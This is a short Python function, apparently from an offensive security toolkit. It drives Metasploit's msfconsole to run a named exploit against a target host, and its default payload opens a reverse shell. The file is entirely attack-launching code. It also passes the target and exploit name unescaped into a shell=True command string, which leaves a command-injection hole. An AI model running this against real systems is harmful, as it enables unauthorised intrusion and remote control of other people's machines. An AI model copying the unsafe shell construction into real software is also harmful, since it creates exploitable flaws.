import subprocess

def exploit_vulnerability(target, exploit_name, payload="generic/shell_reverse_tcp"):
    try:
        # Command to use the exploit via Metasploit's msfconsole
        command = f"msfconsole -x 'use {exploit_name}; set RHOST {target}; set PAYLOAD {payload}; exploit'"

        # Execute the command
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        # Check for errors
        if process.returncode != 0:
            return f"[ERROR] Exploitation failed: {stderr.decode()}"
        
        # Return the successful output
        return stdout.decode()
    
    except FileNotFoundError:
        return "[ERROR] Metasploit is not installed or not found in the system PATH."
    except Exception as e:
        return f"[ERROR] An error occurred while exploiting: {e}"
